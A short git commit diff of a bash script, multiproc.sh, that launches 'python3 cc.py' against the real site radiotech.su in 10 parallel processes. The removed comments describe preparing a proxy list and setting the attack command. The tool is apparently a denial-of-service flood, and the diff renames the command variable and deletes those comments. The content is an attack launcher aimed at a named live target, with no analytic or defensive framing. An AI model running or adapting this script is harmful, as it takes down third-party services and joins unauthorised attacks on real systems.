87772d9dbc991f29b24efd3dad4cbf31c3e28cbf
SN4RK <97697782+SN4RK@users.noreply.github.com>
2022-03-28 05:53:51 +0500

    Add files via upload

--- multiproc.sh
+++ multiproc.sh
@@ -1,12 +1,5 @@
 #!/bin/bash
-#
-#  Please prepared proxies list at first.
-#  And then change the command in atk_cmd
-#  And change the process number
-#  Lastly run this script
-#
-#the command you want to exec
-atk_cmd="python3 cc.py -url https://radiotech.su -s 60"
+ack="python3 cc.py -url https://radiotech.su -s 60"
 
 #number of process that you want
 process=10
